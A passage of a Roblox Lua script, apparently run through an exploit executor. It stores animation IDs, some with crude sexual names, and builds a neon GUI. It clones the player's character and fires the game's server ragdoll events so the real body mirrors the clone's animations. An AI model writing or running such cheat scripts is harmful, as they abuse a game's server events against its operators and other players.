   ["Triste com T"] = 124604199171592,
   ["Line Dancin"] = 101369357281876,
   ["Miruni"] = 87617771479225,
   ["Perfect Score"] = 139292073803836,
   ["Pocket Locket"] = 128618231080047,
   ["Real Slim Shady"] = 101228736701257,
   ["Red1"] = 105435600557305,
   ["Shimmy Wiggle"] = 76082795493886,
   ["Show Ya"] = 108448532674168,
   ["The Dance LAROI"] = 75239905741750,
   ["The Quick Style"] = 103847619627425,
   ["Chihiro2"] = 134841267819107,
   ["Cradles1"] = 132180762791625,
   ["Deep Explorer"] = 99986218616988,
   ["Fast Car"] = 124458006316301,
   ["Halfway"] = 71475729633697,
   ["In My Bed"] = 111991313205546,
   ["Just Know1"] = 72713542992987,
   ["Pogba-Ela joga"] = 126871800781728,
   ["Tyler-Sticky2"] = 134909729564479,
   ["BM-WithSmile"] = 111205373680745,
   ["RinV-Good"] = 97064449863633,
   ["GINTA-KAMASE"] = 109039162634965,
   ["Netflix-Mingle2"] = 126736330036532,
   ["DJRUINA-Bear"] = 125909896768791,
   ["Cake II"] = 14711370865,
   ["Solo"] = 14907680676,
   ["ASAP"] = 9183680092,
   ["ANTIFRAGILE"] = 15178352490,
   ["Action"] = 15437674680,
   ["Adios"] = 15183462851,
   ["Alcohol-Free"] = 15507151401,
   ["Anpanman"] = 15507627471,
   ["I'll Show You"] = 15634516315,
   ["Drama"] = 15569498104,
   ["Dolphin"] = 15634547372,
   ["Abracadabra"] = 14957258734,
   ["All Eyes On Me"] = 15104893350,
   ["BBUSYEO"] = 9991485864,
   ["BBoom BBoom"] = 12008828114,
   ["Baby Don't Stop"] = 15086711293,
   ["Back In Vogue"] = 15178366587,
   ["Baddie"] = 15254578171,
   ["Batter Up"] = 15553568636,
   ["Blah Blah Blah"] = 14648343355,
   ["Pretty Savage"] = 17164801888,
   ["Boom"] = 15569628760,
   ["Boombayah"] = 15254273286,
   ["Bouncy"] = 14143674954,
   ["Boy With Luv"] = 13361878864,
   ["Igloo"] = 72705631233287,
   ["Charmer"] = 14456520068,
   ["Cheshire"] = 14845155835,
   ["Chili"] = 15306601096,
   ["Converse High"] = 15569468810,
   ["Cry For Me"] = 14958064290,
   ["Cupid Dance"] = 14458761918,
   ["DDARA"] = 15745877593,
   ["DEEP"] = 14456866502,
   ["Next Level"] = 73666718896602,
   ["Dance The Night Away"] = 15437651094,
   ["Deja vÃ¹"] = 15746540104,
   ["Ditto"] = 14306647474,
   ["Do Not Touch"] = 15428845859,
   ["Doughnut"] = 15254341227,
   ["Dreams Come"] = 9249771813,
   ["Drunk-Dazed"] = 15746942410,
   ["Dumb Dumb"] = 15747119564,
   ["BTBT"] = 11562114786,
   ["IVE-Supernova Love"] = 136917630185596,
   ["Breakthrough"] = 15710888621,
   ["Dancing King"] = 15710689397,
   ["Dream Of You"] = 15701655961,
   ["Fingertip"] = 15710794282,
   ["Get It"] = 15710919135,
   ["Like OOH-AHH"] = 15711239792,
   ["So Hot"] = 15706683049,
   ["Eunoia"] = 13006438318,
   ["Eve, Psyche & BW"] = 14143553486,
   ["Fancy"] = 15254438022,
   ["Fast Forward"] = 15103490862,
   ["Fearless"] = 9604542135,
   ["Fire"] = 10297929371,
   ["Flowers"] = 14360321360,
   ["GGBB"] = 14758568953,
   ["Galileo"] = 15254328512,
   ["Peek-A-Boo"] = 17188208710,
   ["GingaMingaYo"] = 12168640144,
   ["Go Big or Go Home"] = 15178354473,
   ["Go Hard"] = 14840759624,
   ["Ready For Love"] = 110272002917472,
   ["Grl Gvng"] = 15314684858,
   ["Guerrilla"] = 15427967206,
   ["Gum"] = 15319042831,
   ["Whiplash"] = 84761716541897,
   ["Red Lights1"] = 79483595485043,
   ["Filter"] = 15769956533,
   ["Crazy Form"] = 15770022100,
   ["Attention"] = 15786493717,
   ["SKZ-Giant"] = 82086620169755,
   ["HIT YA!"] = 14648380354,
   ["Airplane pt 2"] = 17175043979,
   ["Hope World"] = 17832909398,
   ["Hula Hoop"] = 12168870616,
   ["Fate"] = 17068636413,
   ["Hype Boy"] = 14690505486,
   ["I Can't Stop Me"] = 15437508723,
   ["I Love My Body"] = 15044170099,
   ["INVU"] = 14709181461,
   ["LOSER=LOVER"] = 14884131961,
   ["Impurities"] = 15252093658,
   ["Cake"] = 14758473677,
   ["Ringo"] = 14977014999,
   ["The Idol"] = 14709052794,
   ["More"] = 15926531281,
   ["Look At Me"] = 17069753179,
   ["Mysterious"] = 15880335321,
   ["New Dance"] = 15880457949,
   ["None of My Business"] = 15880405184,
   ["Candy Pop"] = 15954541522,
   ["Kitsch"] = 15957486812,
   ["Scientist"] = 15957626186,
   ["Moonlight"] = 14360382400,
   ["Lion"] = 15178359180,
   ["Like Crazy"] = 17243081974,
   ["Chk Chk Boom 2"] = 89053989634034,
   ["Love Me Like This"] = 15254167229,
   ["Love Shot"] = 15042011356,
   ["Lovesick Girl"] = 14337920126,
   ["NEW WOMAN"] = 131721216910827,
   ["Megaverse"] = 15431172216,
   ["Mc Chicken Dance"] = 14709031676,
   ["Starry Night"] = 82009339442151,
   ["My Name V"] = 10783558665,
   ["Mash Up"] = 14649333000,
   ["My Bag"] = 15996204502,
   ["Naughty Boy"] = 15569786978,
   ["OMG"] = 14360424066,
   ["Nxde"] = 16005012294,
   ["Nobody"] = 15504654082,
   ["New Jeans"] = 14907708508,
   ["One More Time"] = 15316785104,
   ["Pandora"] = 15995791226,
   ["My Pace"] = 16089778475,
   ["Me (Rap)"] = 16121871257,
   ["Love Love Love"] = 16120595987,
   ["Hold On Tight"] = 16020395771,
   ["Yes or Yes"] = 15957562949,
   ["Chase Love Hard"] = 16214805483,
   ["UP4"] = 117605822363146,
   ["TT"] = 16492220339,
   ["SoÃ±ar"] = 16302177686,
   ["Maria"] = 16302946151,
   ["Love Dive"] = 16299894030,
   ["Crazy Over You"] = 16302880378,
   ["Debut"] = 102726205399656,
   ["Better Things"] = 16423848646,
   ["Fact Check"] = 16423407915,
   ["Russian Roulette"] = 16388655889,
   ["Kill This Love 2"] = 16491833044,
   ["Untouchable II"] = 16302111242,
   ["Wife"] = 16388628018,
   ["Super Lady"] = 16302081447,
   ["Candy"] = 16582854299,
   ["Not Shy"] = 16582998069,
   ["Spring Day"] = 16582791937,
   ["I'm not cool"] = 16671546299,
   ["Log in"] = 16669666941,
   ["Perfect Night"] = 15422072504,
   ["Pink Venom"] = 14360487641,
   ["Pirate"] = 9577608405,
   ["Poppy"] = 14913019144,
   ["Pose"] = 15437793544,
   ["Easy"] = 16755161447,
   ["Maniac 2"] = 16826050749,
   ["Queencard"] = 14390206440,
   ["Ring The Alarm"] = 15104827793,
   ["Ring x Ring"] = 15507689525,
   ["Roly Poly"] = 16120658006,
   ["Rose"] = 12977552708,
   ["TTYL"] = 70816579313825,
   ["CRAZY 2"] = 79445566802891,
   ["SG"] = 9715503915,
   ["Seven"] = 14390424694,
   ["Seven 2"] = 16817182259,
   ["Shooting Stars"] = 12871295658,
   ["Paint The Town"] = 17079779758,
   ["Set Me Free"] = 15432823630,
   ["Slay"] = 14811111697,
   ["Snake"] = 9604765491,
   ["Sneakers"] = 12138500641,
   ["Social Path"] = 14950111063,
   ["Spicy"] = 14230856023,
   ["Sweet Crazy Love"] = 12977606310,
   ["Super Tuna"] = 17833000129,
   ["Super Shy"] = 15357058625,
   ["Sugar"] = 16817904771,
   ["Run Away1"] = 135670294474657,
   ["Baam"] = 16826181626,
   ["Thirsty"] = 16906160228,
   ["Very Nice"] = 16924724555,
   ["Smart"] = 16925912001,
   ["Q&A"] = 16995826438,
   ["Playing With Fire"] = 16995558532,
   ["Armageddon"] = 18863495250,
   ["Win"] = 17079972610,
   ["Royal"] = 17068825635,
   ["Magnetic II"] = 17353634431,
   ["Young, Dumb, Stupid"] = 17266568423,
   ["Purr"] = 17243669137,
   ["Nobody Knows"] = 17266485887,
   ["Mirotic"] = 17362134841,
   ["JJAM"] = 128058242953208,
   ["Midas Touch"] = 17362739079,
   ["Crazy"] = 17353843330,
   ["Before U Go"] = 17353745726,
   ["Blue Bood"] = 17437097964,
   ["Chicken Noodle Soup"] = 17446635891,
   ["HEYA"] = 17439113373,
   ["Sheesh II"] = 17439802258,
   ["Talk That Talk"] = 15053175546,
   ["TGIF"] = 15044143466,
   ["TOMBOY"] = 17558055394,
   ["The Girls"] = 14745099838,
   ["The Eve"] = 15314740242,
   ["That That"] = 9577219971,
   ["The Black Cat Nero"] = 15042534606,
   ["WaveWay"] = 124625882154906,
   ["TIKI TAKA"] = 17560001332,
   ["Top Or Cliff"] = 15109594086,
   ["Typa Girl (Intro)"] = 14690394983,
   ["Unforgiven"] = 14354058855,
   ["Vengeance"] = 17567602391,
   ["Tinnitus"] = 13539158026,
   ["woo!ah!"] = 14690438699,
   ["World"] = 15178283482,
   ["Xoxo"] = 15569894153,
   ["ZOO"] = 14287825206,
   ["Woman II"] = 9183689189,
   ["Wannabe II"] = 14908291589,
   ["Lucky Girl Syndrome"] = 17518983536,
   ["Supernova"] = 17509367733,
   ["Zoom"] = 17589910939,
   ["Oh my god"] = 17509688608,
   ["Permission To Dance"] = 17659577567,
   ["Impossible"] = 17589061583,
   ["Accendio"] = 17659639868,
   ["Bad Reputation"] = 17772959723,
   ["KISS"] = 17769582250,
   ["The Boots"] = 17832398448,
   ["UP&DOWN"] = 17830998987,
   ["Move"] = 17831074021,
   ["How Sweet"] = 17846925892,
   ["HIP"] = 17832633275,
   ["How Sweet - pt2"] = 18331481588,
   ["Pop Like This"] = 18319061287,
   ["Megan-That Style"] = 118244079190674,
   ["LK-Oncinhas"] = 75419590211428,
   ["Tobii-Bad Girls"] = 85827618059547,
   ["APTs"] = 108794829512642,
   ["Sage-GasPedal"] = 136751837272445,
   ["2Pac-Want it"] = 78088451215023,
   ["Maps"] = 138580335785363,
   ["Leat-Nya Arigato2"] = 138814469709630,
   ["Million Dollar Baby"] = 17512824075,
   ["Netflix-Mingle"] = 138292957837319,
   ["Tyla-PUSH 2"] = 122397638290852,
   ["Don-No Pole"] = 77504522238611,
   ["MichaelPrince-Finesse"] = 118856249569207,
   ["Tyler-Sticky"] = 82591052342579,
   ["7dnight-Gwenchana"] = 133834197390854,
   ["SeanK-Beat It"] = 72963340508086,
   ["djlox-Throat"] = 84405181207305,
   ["Wannabe"] = 14837885432,
   ["Just Dance"] = 14797631924,
   ["Ashley, look at me!"] = 14372354950,
   ["Muerto Gang"] = 14629687441,
   ["Cha Cha Cha"] = 15041933237,
   ["Simple Dimple"] = 15103561717,
   ["September"] = 15086356834,
   ["Me too"] = 15095853911,
   ["Hey Now"] = 15086240204,
   ["Faded Shuffle"] = 15065451084,
   ["Dusk Till Dawn"] = 15086714992,
   ["Coincidance"] = 15103592543,
   ["How Sweet - pt2"] = 18331463874,
   ["GANGNAM STYLE"] = 18553011864,
   ["SLIM SHADY"] = 18553150120,
   ["SNOOPâS WALK"] = 132477655284495,
   ["BEAT IT (MJ)"] = 138424855756,
   ["JAYWALKING"] = 10970927618,
   ["WORM"] = 7160307855,
   ["GTA"] = 18743035691,
   ["SPIDER-MAN"] = 8228461600,
   ["MONSTER SHUFFLE"] = 9249757736,
   ["beggin"] = 14052940722,
   ["heel toe toprock"] = 14053176456,
   ["dumb feet"] = 14053155061,
   ["kazotsky kick"] = 14053223573,
   ["im diamond"] = 14053214985,
   ["last forever"] = 14053226316,
   ["raise the roof"] = 14053240024,
    }
    local newAnimations = {
        ["twerking"] = 91014640753525,
        ["Wait love me like  I love you"] = 113197266804415,
        ["head banger (fortnite)"] = 117390128696430,
        ["egg dance ( acu saya)"] = 14765075073,
        ["nya arigato"] = 16038410193,
        ["move ya body"] = 109551168484965,
        ["hug"] = 113001288211277,
        ["push 2 start"] = 121825287394407,
        ["jumpstyle"] = 127818220981023,
        ["kiss"] = 130415689601813,
        ["jerk off"] = 85510928563896,
        ["backshots"] = 107788763755159
    }
    for animName, animId in pairs(newAnimations) do
        if not BuiltInAnimationsR15[animName] then
            BuiltInAnimationsR15[animName] = animId
            print("Added animation:", animName, "with ID:", animId)
        else
            print("Duplicate animation ID found, skipping:", animName, "with ID:", animId)
        end
    end
    local favoriteAnimations = {}
    local animationKeybinds = {}

    -- Table to mark newly added animations (using timestamp so newest come first)
    local recentlyAdded = {}

    -----------------------------------------------------------
    -- File Saving / Loading Methods (Same as favorites)
    -----------------------------------------------------------
    local function saveBuiltInAnimations()
        local success, encoded =
            pcall(
            function()
                return HttpService:JSONEncode(BuiltInAnimationsR15)
            end
        )
        if success and writefile then
            pcall(
                function()
                    writefile("builtin_animations_neon.json", encoded) -- GeÃ¤nderter Dateiname
                end
            )
        end
    end

    local function loadBuiltInAnimations()
        local success, content = pcall(readfile, "builtin_animations_neon.json") -- GeÃ¤nderter Dateiname
        if success then
            local decodeSuccess, decoded =
                pcall(
                function()
                    return HttpService:JSONDecode(content)
                end
            )
            if decodeSuccess and typeof(decoded) == "table" then
                BuiltInAnimationsR15 = decoded
            end
        end
    end

    local function saveFavorites()
        local success, encoded =
            pcall(
            function()
                return HttpService:JSONEncode(favoriteAnimations)
            end
        )
        if success and writefile then
            pcall(
                function()
                    writefile("favorite_animations_neon.json", encoded) -- GeÃ¤nderter Dateiname
                end
            )
        end
    end

    local function loadFavorites()
        local success, content = pcall(readfile, "favorite_animations_neon.json") -- GeÃ¤nderter Dateiname
        if success then
            local decodeSuccess, decoded =
                pcall(
                function()
                    return HttpService:JSONDecode(content)
                end
            )
            if decodeSuccess and typeof(decoded) == "table" then
                favoriteAnimations = decoded
            else
                favoriteAnimations = {}
            end
        else
            favoriteAnimations = {}
        end
    end

    -- Load keybinds function
    local function loadKeybinds()
    local success, content = pcall(readfile, "animation_keybinds_neon.json") -- GeÃ¤nderter Dateiname
    if success then
        local decodeSuccess, decoded =
            pcall(
            function()
                return HttpService:JSONDecode(content)
            end
        )
        if decodeSuccess and typeof(decoded) == "table" then
            for animName, keyName in pairs(decoded) do
                animationKeybinds[animName] = Enum.KeyCode[keyName]
            end
        else
            animationKeybinds = {}
        end
    else
        animationKeybinds = {}
    end
    end

    -- Save keybinds function
    local function saveKeybinds()
    local keybindsToSave = {}
    for animName, keyCode in pairs(animationKeybinds) do
        -- Only save valid keybinds
        if keyCode then
            keybindsToSave[animName] = keyCode.Name
        end
    end

    local success, encoded = pcall(function()
        return HttpService:JSONEncode(keybindsToSave)
    end)

    if success and writefile then -- writefile hinzugefÃ¼gt
        pcall(writefile, "animation_keybinds_neon.json", encoded) -- GeÃ¤nderter Dateiname
    end
    end
    -- Call loading functions at startup
    loadBuiltInAnimations()
    loadFavorites()
    loadKeybinds()

    local function scaleCFrame(cf, scale)
        local pos = cf.Position * scale
        local xRot, yRot, zRot = cf:ToEulerAnglesXYZ()
        return CFrame.new(pos) * CFrame.Angles(xRot, yRot, zRot)
    end

    local function adjustCloneToGround(clone)
        if not clone then
            return
        end
        local lowestY = math.huge
        for _, part in ipairs(clone:GetDescendants()) do
            if part:IsA("BasePart") then
                local bottomY = part.Position.Y - (part.Size.Y / 2)
                if bottomY < lowestY then
                    lowestY = bottomY
                end
            end
        end
        local offset = 0 - lowestY
        if offset > 0 then
            if clone.PrimaryPart then
                clone:SetPrimaryPartCFrame(clone.PrimaryPart.CFrame + Vector3.new(0, offset, 0))
            else
                clone:TranslateBy(Vector3.new(0, offset, 0))
            end
        end
    end

    local preservedGuis = {}
    local function preserveGuis()
        local playerGui = LocalPlayer:FindFirstChildWhichIsA("PlayerGui")
        if playerGui then
            for _, gui in ipairs(playerGui:GetChildren()) do
                if gui:IsA("ScreenGui") and gui.ResetOnSpawn then
                    table.insert(preservedGuis, gui)
                    gui.ResetOnSpawn = false
                end
            end
        end
    end
    local function restoreGuis()
        for _, gui in ipairs(preservedGuis) do
            gui.ResetOnSpawn = true
        end
        table.clear(preservedGuis)
    end

    local function updateCloneScale()
        if not ghostClone then
            return
        end
        for part, origSize in pairs(ghostOriginalSizes) do
            if part and part:IsA("BasePart") then
                part.Size =
                    Vector3.new(origSize.X * cloneSize * cloneWidth, origSize.Y * cloneSize, origSize.Z * cloneSize)
            end
        end
        for motor, orig in pairs(ghostOriginalMotorCFrames) do
            if motor and motor:IsA("Motor6D") then
                local c0, c1 = orig.C0, orig.C1
                motor.C0 =
                    CFrame.new(
                    c0.Position.X * cloneSize * cloneWidth,
                    c0.Position.Y * cloneSize,
                    c0.Position.Z * cloneSize
                ) * CFrame.Angles(c0:ToEulerAnglesXYZ())
                motor.C1 =
                    CFrame.new(
                    c1.Position.X * cloneSize * cloneWidth,
                    c1.Position.Y * cloneSize,
                    c1.Position.Z * cloneSize
                ) * CFrame.Angles(c1:ToEulerAnglesXYZ())
            end
        end
        local ghostHumanoid = ghostClone:FindFirstChildWhichIsA("Humanoid")
        if ghostHumanoid and ghostOriginalHipHeight then
            ghostHumanoid.HipHeight = ghostOriginalHipHeight * cloneSize
        end
        adjustCloneToGround(ghostClone)
    end

    local function updateCloneTransparency()
        if not ghostClone then
            return
        end
        for _, part in pairs(ghostClone:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = 1
            end
        end
        local head = ghostClone:FindFirstChild("Head")
        if head then
            for _, child in ipairs(head:GetChildren()) do
                if child:IsA("Decal") then
                    child.Transparency = 1
                end
            end
        end
    end

    local function updateRagdolledParts()
        if not ghostEnabled or not originalCharacter or not ghostClone then
            return
        end
        for _, partName in ipairs(bodyParts) do
            local originalPart = originalCharacter:FindFirstChild(partName)
            local clonePart = ghostClone:FindFirstChild(partName)
            if originalPart and clonePart then
                originalPart.CFrame = clonePart.CFrame
                originalPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                originalPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
            end
        end
    end

    local function setGhostEnabled(newState)
        if not newState and ghostEnabled then
            if fakeAnimRunning then
                stopFakeAnimation()
            end
        end
        ghostEnabled = newState
        if ghostEnabled then
            local char = LocalPlayer.Character
            if not char then
                warn("Kein Charakter gefunden!")
                return
            end
            local humanoid = char:FindFirstChildWhichIsA("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")
            if not humanoid or not root then
                warn("Humanoid oder RootPart fehlt!")
                return
            end
            originalCharacter = char
            originalCFrame = root.CFrame
            char.Archivable = true
            ghostClone = char:Clone()
            char.Archivable = false
            ghostClone.Name = originalCharacter.Name .. "_clone"
            local ghostHumanoid = ghostClone:FindFirstChildWhichIsA("Humanoid")
            if ghostHumanoid then
                ghostHumanoid.DisplayName = originalCharacter.Name .. "_clone"
                ghostOriginalHipHeight = ghostHumanoid.HipHeight
            end
            if not ghostClone.PrimaryPart then
                local hrp = ghostClone:FindFirstChild("HumanoidRootPart")
                if hrp then
                    ghostClone.PrimaryPart = hrp
                end
            end
            for _, part in ipairs(ghostClone:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Transparency = 1
                end
            end
            local head = ghostClone:FindFirstChild("Head")
            if head then
                for _, child in ipairs(head:GetChildren()) do
                    if child:IsA("Decal") then
                        child.Transparency = 1
                    end
                end
            end
            ghostOriginalSizes = {}
            ghostOriginalMotorCFrames = {}
            for _, desc in ipairs(ghostClone:GetDescendants()) do
                if desc:IsA("BasePart") then
                    ghostOriginalSizes[desc] = desc.Size
                elseif desc:IsA("Motor6D") then
                    ghostOriginalMotorCFrames[desc] = {C0 = desc.C0, C1 = desc.C1}
                end
            end
            if cloneSize ~= 1 or cloneWidth ~= 1 then
                updateCloneScale()
            end
            local animate = originalCharacter:FindFirstChild("Animate")
            if animate then
                originalAnimateScript = animate
                originalAnimateScript.Disabled = true
                originalAnimateScript.Parent = ghostClone
            end
            preserveGuis()
            ghostClone.Parent = originalCharacter.Parent
            adjustCloneToGround(ghostClone)
            LocalPlayer.Character = ghostClone
            if ghostHumanoid then
                Workspace.CurrentCamera.CameraSubject = ghostHumanoid
            end
            restoreGuis()
            if originalAnimateScript then
                originalAnimateScript.Disabled = false
            end
            task.delay(
                0,
                function()
                    if not ghostEnabled then
                        return
                    end
                    ReplicatedStorage.RagdollEvent:FireServer()
                    task.delay(
                        0,
                        function()
                            if not ghostEnabled then
                                return
                            end
                            if updateConnection then
                                updateConnection:Disconnect()
                            end
                            updateConnection = RunService.Heartbeat:Connect(updateRagdolledParts)
                        end
                    )
                end
            )
        else
            if updateConnection then
                updateConnection:Disconnect()
                updateConnection = nil
            end
            if not originalCharacter or not ghostClone then
                return
            end
            for i = 1, 3 do
                ReplicatedStorage.UnragdollEvent:FireServer()
                task.wait(0.1)
            end
            local origRoot = originalCharacter:FindFirstChild("HumanoidRootPart")
            local ghostRoot = ghostClone:FindFirstChild("HumanoidRootPart")
            local targetCFrame = ghostRoot and ghostRoot.CFrame or originalCFrame
            local animate = ghostClone:FindFirstChild("Animate")
            if animate then
                animate.Disabled = true
                animate.Parent = originalCharacter
            end
            ghostClone:Destroy()
            if origRoot then
                origRoot.CFrame = targetCFrame
            end
            local origHumanoid = originalCharacter:FindFirstChildWhichIsA("Humanoid")
            preserveGuis()
            LocalPlayer.Character = originalCharacter
            if origHumanoid then
                Workspace.CurrentCamera.CameraSubject = origHumanoid
            end
            restoreGuis()
            if animate then
                task.wait(0.1)
                animate.Disabled = false
            end
            cloneSize = 1
            cloneWidth = 1
        end
    end

    local localFakeAnimStop, fakeAnimRunning = false, false
    local fakeAnimSpeed = 1
    local function stopFakeAnimation()
        localFakeAnimStop = true
        fakeAnimRunning = false
        for _, script in pairs(ghostClone:GetChildren()) do
            if script:IsA("LocalScript") and not script.Enabled then
                script.Enabled = true
            end
        end
        if ghostClone then
            for motor, orig in pairs(ghostOriginalMotorCFrames) do
                if motor and motor:IsA("Motor6D") then
                    motor.C0 = orig.C0
                    motor.C1 = orig.C1
                end
            end
            for _, partName in ipairs(bodyParts) do
                local part = ghostClone:FindFirstChild(partName)
                if part and part:IsA("BasePart") then
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end
        end
    end

    local function playFakeAnimation(animationId)
        if not ghostClone then
            warn("Kein Fake-Charakter verfÃ¼gbar!")
            return
        end
        if animationId == "" then
            return
        end
        if fakeAnimRunning then
            stopFakeAnimation()
        end
        wait(0.1)
        cloneSize = 1
        cloneWidth = 1
        updateCloneScale()
        for motor, orig in pairs(ghostOriginalMotorCFrames) do
            motor.C0 = orig.C0
        end
        local success, NeededAssets =
            pcall(
            function()
                return game:GetObjects("rbxassetid://" .. animationId)[1]
            end
        )
        if not success or not NeededAssets then
            warn("UngÃ¼ltige Animations-ID.")
            return
        end
        local character = ghostClone
        local rootPart = character:WaitForChild("HumanoidRootPart")
        local head = character:WaitForChild("Head")
        local leftFoot = character:WaitForChild("LeftFoot")
        local leftHand = character:WaitForChild("LeftHand")
        local leftLowerArm = character:WaitForChild("LeftLowerArm")
        local leftLowerLeg = character:WaitForChild("LeftLowerLeg")
        local leftUpperArm = character:WaitForChild("LeftUpperArm")
        local leftUpperLeg = character:WaitForChild("LeftUpperLeg")
        local lowerTorso = character:WaitForChild("LowerTorso")
        local rightFoot = character:WaitForChild("RightFoot")
        local rightHand = character:WaitForChild("RightHand")
        local rightLowerArm = character:WaitForChild("RightLowerArm")
        local rightLowerLeg = character:WaitForChild("RightLowerLeg")
        local rightUpperArm = character:WaitForChild("RightUpperArm")
        local rightUpperLeg = character:WaitForChild("RightUpperLeg")
        local upperTorso = character:WaitForChild("UpperTorso")
        local Joints = {
            ["Torso"] = rootPart:FindFirstChild("RootJoint"),
            ["Head"] = head:FindFirstChild("Neck"),
            ["LeftUpperArm"] = leftUpperArm:FindFirstChild("LeftShoulder"),
            ["RightUpperArm"] = rightUpperArm:FindFirstChild("RightShoulder"),
            ["LeftUpperLeg"] = leftUpperLeg:FindFirstChild("LeftHip"),
            ["RightUpperLeg"] = rightUpperLeg:FindFirstChild("RightHip"),
            ["LeftFoot"] = leftFoot:FindFirstChild("LeftAnkle"),
            ["RightFoot"] = rightFoot:FindFirstChild("RightAnkle"),
            ["LeftHand"] = leftHand:FindFirstChild("LeftWrist"),
            ["RightHand"] = rightHand:FindFirstChild("RightWrist"),
            ["LeftLowerArm"] = leftLowerArm:FindFirstChild("LeftElbow"),
            ["RightLowerArm"] = rightLowerArm:FindFirstChild("RightElbow"),
            ["LeftLowerLeg"] = leftLowerLeg:FindFirstChild("LeftKnee"),
            ["RightLowerLeg"] = rightLowerLeg:FindFirstChild("RightKnee"),
            ["LowerTorso"] = lowerTorso:FindFirstChild("Root"),
            ["UpperTorso"] = upperTorso:FindFirstChild("Waist")
        }
        localFakeAnimStop = false
        fakeAnimRunning = true
        local part = Instance.new("Part")
        part.Size = Vector3.new(2048, 0.1, 2048)
        part.Anchored = true
        part.Position = game.Players.LocalPlayer.Character.LowerTorso.Position + Vector3.new(0, -0.2, 0)
        part.Transparency = 1
        part.Parent = workspace
        game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true
        wait(0.1)
        for _, script in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if script:IsA("LocalScript") and script.Enabled then
                script.Enabled = false
            end
        end
        game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
        part:Destroy()
        spawn(
            function()
                while fakeAnimRunning do
                    if localFakeAnimStop then
                        fakeAnimRunning = false
                        break
                    end
                    pcall(
                        function()
                            local keyframes = NeededAssets:GetKeyframes()
                            for ii = 1, #keyframes do
                                if localFakeAnimStop then
                                    break
                                end
                                local currentFrame = keyframes[ii]
                                local nextFrame = keyframes[ii + 1] or keyframes[1]
                                local currentTime = currentFrame.Time
                                local nextTime = nextFrame.Time
                                if nextTime <= currentTime then
                                    nextTime = nextTime + NeededAssets.Length
                                end
                                local frameLength = (nextTime - currentTime) / fakeAnimSpeed
                                local startTime = tick()
                                while tick() - startTime < frameLength and not localFakeAnimStop do
                                    local alpha = (tick() - startTime) / frameLength
                                    pcall(
                                        function()
                                            for _, currentPose in pairs(currentFrame:GetDescendants()) do
                                                local nextPose = nextFrame:FindFirstChild(currentPose.Name, true)
                                                local motor = Joints[currentPose.Name]
                                                if motor and nextPose and ghostOriginalMotorCFrames[motor] then
                                                    local currentCF =
                                                        ghostOriginalMotorCFrames[motor].C0 * currentPose.CFrame
                                                    local nextCF =
                                                        ghostOriginalMotorCFrames[motor].C0 * nextPose.CFrame
                                                    motor.C0 = currentCF:Lerp(nextCF, alpha)
                                                end
                                            end
                                        end
                                    )
                                    RunService.RenderStepped:Wait()
                                end
                            end
                        end
                    )
                    wait(0.03)
                end
            end
        )
    end

    ------------------------------------------------------------------------------
    -- Utility: Double Prompt for Adding an Animation (Neon Style)
    ------------------------------------------------------------------------------
    local function createDoublePrompt(title, placeholder1, placeholder2, callback)
        local promptGui = Instance.new("ScreenGui")
        promptGui.Name = "NeonDoublePromptGui"
        promptGui.ResetOnSpawn = false
        promptGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling -- Wichtig fÃ¼r Ãberlappung
        promptGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

        local promptFrame = Instance.new("Frame")
        promptFrame.Size = UDim2.new(0, 380, 0, 220) -- Etwas grÃ¶Ãer fÃ¼r den Stil
        promptFrame.Position = UDim2.new(0.5, -190, 0.5, -110)
        promptFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25) -- Dunkler Hintergrund
        promptFrame.BorderColor3 = Color3.fromRGB(0, 255, 255) -- Cyan Rand
        promptFrame.BorderSizePixel = 2
        local pfCorner = Instance.new("UICorner")
        pfCorner.CornerRadius = UDim.new(0, 8) -- Weniger abgerundet
        pfCorner.Parent = promptFrame
        promptFrame.Parent = promptGui

        local titleLabel = Instance.new("TextLabel")
        titleLabel.Size = UDim2.new(1, -10, 0, 40)
        titleLabel.Position = UDim2.new(0, 5, 0, 5)
        titleLabel.Text = title
        titleLabel.TextColor3 = Color3.fromRGB(0, 255, 255) -- Cyan Text
        titleLabel.BackgroundTransparency = 1
        titleLabel.Font = Enum.Font.SourceSansBold -- GeÃ¤nderte Schriftart
        titleLabel.TextSize = 22
        titleLabel.Parent = promptFrame

        local nameLabel = Instance.new("TextLabel")
        nameLabel.Size = UDim2.new(0.4, -15, 0, 30)
        nameLabel.Position = UDim2.new(0, 15, 0, 55)
        nameLabel.Text = "Animationsname:"
        nameLabel.TextColor3 = Color3.fromRGB(220, 220, 255) -- Heller Lavendel
        nameLabel.BackgroundTransparency = 1
        nameLabel.Font = Enum.Font.SourceSans -- GeÃ¤nderte Schriftart
        nameLabel.TextSize = 16
        nameLabel.TextXAlignment = Enum.TextXAlignment.Left
        nameLabel.Parent = promptFrame

        local nameBox = Instance.new("TextBox")
        nameBox.Size = UDim2.new(0.55, -15, 0, 30)
        nameBox.Position = UDim2.new(0.45, 0, 0, 55)
        nameBox.PlaceholderText = placeholder1
        nameBox.Text = ""
        nameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        nameBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45) -- Dunkleres Feld
        nameBox.BorderColor3 = Color3.fromRGB(255, 0, 255) -- Magenta Rand
        nameBox.BorderSizePixel = 1
        nameBox.ClearTextOnFocus = false
        nameBox.Font = Enum.Font.SourceSans
        local nbCorner = Instance.new("UICorner")
        nbCorner.CornerRadius = UDim.new(0, 4)
        nbCorner.Parent = nameBox
        nameBox.Parent = promptFrame

        local idLabel = Instance.new("TextLabel")
        idLabel.Size = UDim2.new(0.4, -15, 0, 30)
        idLabel.Position = UDim2.new(0, 15, 0, 100)
        idLabel.Text = "Animations-ID:"
        idLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
        idLabel.BackgroundTransparency = 1
        idLabel.Font = Enum.Font.SourceSans
        idLabel.TextSize = 16
        idLabel.TextXAlignment = Enum.TextXAlignment.Left
